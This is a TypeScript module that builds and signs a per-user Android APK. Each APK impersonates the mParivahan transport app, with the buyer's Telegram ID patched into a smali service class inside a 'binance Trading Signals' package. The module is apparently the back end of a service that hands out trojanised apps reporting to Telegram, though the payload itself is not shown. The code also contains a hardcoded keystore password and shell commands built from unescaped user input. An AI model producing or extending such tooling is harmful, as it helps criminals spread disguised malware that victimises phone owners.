import { exec } from "child_process";
import { promisify } from "util";
import * as fs from "fs";
import * as path from "path";
import { fileURLToPath } from "url";

const execAsync = promisify(exec);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const WORKSPACE_ROOT = path.resolve(__dirname, "..", "..", "..");
const OUTPUT_DIR = path.join(WORKSPACE_ROOT, "output");
const APK_CACHE_DIR = path.join(OUTPUT_DIR, "apk_cache");

// Pre-built base template (decoded smali dir, already patched with placeholder)
const APK_TEMPLATE_DIR = "/tmp/apk_patch/decoded";
const BASE_TEMPLATE_APK = path.join(OUTPUT_DIR, "mParivahan_base_template.apk");

const OWNER_PLACEHOLDER = "OWNER_TELEGRAM_ID_000000000";
const SMALI_FILE_REL = "smali_classes63/dApp/binance/Trading/Signals/MyService$1.smali";

// Tool paths
const JAVA     = "/nix/store/xad649j61kwkh0id5wvyiab5rliprp4d-openjdk-17.0.15+6/bin/java";
const APKTOOL  = "/nix/store/vwykh57qc5rc7wi9yc16hzn2kycdbcdr-apktool-2.11.1/bin/apktool";
const JARSIGNER = "/nix/store/xad649j61kwkh0id5wvyiab5rliprp4d-openjdk-17.0.15+6/bin/jarsigner";
const KEYSTORE = path.join(OUTPUT_DIR, "release.keystore");

export async function getApkPath(): Promise<string | null> {
  const candidates = [
    path.join(OUTPUT_DIR, "mParivahan_v2.apk"),
    path.join(OUTPUT_DIR, "mParivahan_yellowstone.apk"),
    path.join(OUTPUT_DIR, "mParivahan_CyberZone.apk"),
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  return null;
}

/**
 * Build a per-user APK with ownerTelegramId baked into the smali.
 * First call per user takes ~30s (apktool build + sign). Subsequent calls
 * return instantly from cache.
 */
export async function buildUserApk(telegramId: string): Promise<string | null> {
  // Ensure cache dir exists
  fs.mkdirSync(APK_CACHE_DIR, { recursive: true });

  // Return cached APK if it exists
  const cachedApk = path.join(APK_CACHE_DIR, `${telegramId}.apk`);
  if (fs.existsSync(cachedApk)) return cachedApk;

  // Ensure decoded template exists (decode from base template APK if needed)
  if (!fs.existsSync(path.join(APK_TEMPLATE_DIR, SMALI_FILE_REL))) {
    const base = BASE_TEMPLATE_APK || await getApkPath();
    if (!base) return null;
    await execAsync(`${APKTOOL} d -f -o "${APK_TEMPLATE_DIR}" "${base}"`);
  }

  // Copy template smali dir to per-user build dir
  const buildDir = `/tmp/apk_build_${telegramId}`;
  await execAsync(`cp -r "${APK_TEMPLATE_DIR}" "${buildDir}"`);

  // Patch smali: replace placeholder with actual Telegram ID
  const smaliPath = path.join(buildDir, SMALI_FILE_REL);
  const content = fs.readFileSync(smaliPath, "utf-8");
  if (!content.includes(OWNER_PLACEHOLDER)) {
    // Template wasn't patched yet — skip (APK won't have ownerTelegramId)
  } else {
    fs.writeFileSync(smaliPath, content.replace(OWNER_PLACEHOLDER, telegramId), "utf-8");
  }

  // Rebuild APK from smali
  const unsignedApk = `/tmp/apk_unsigned_${telegramId}.apk`;
  await execAsync(`${APKTOOL} b "${buildDir}" -o "${unsignedApk}"`);

  // Sign with jarsigner
  await execAsync(
    `${JARSIGNER} -sigalg SHA256withRSA -digestalg SHA-256 ` +
    `-keystore "${KEYSTORE}" -storepass android123 -keypass android123 ` +
    `"${unsignedApk}" release`
  );

  // Move to cache
  fs.renameSync(unsignedApk, cachedApk);

  // Cleanup build dir in background
  execAsync(`rm -rf "${buildDir}"`).catch(() => {});

  return cachedApk;
}

export function getApkSize(apkPath: string): string {
  try {
    const stats = fs.statSync(apkPath);
    const mb = (stats.size / (1024 * 1024)).toFixed(1);
    return `${mb} MB`;
  } catch {
    return "unknown size";
  }
}
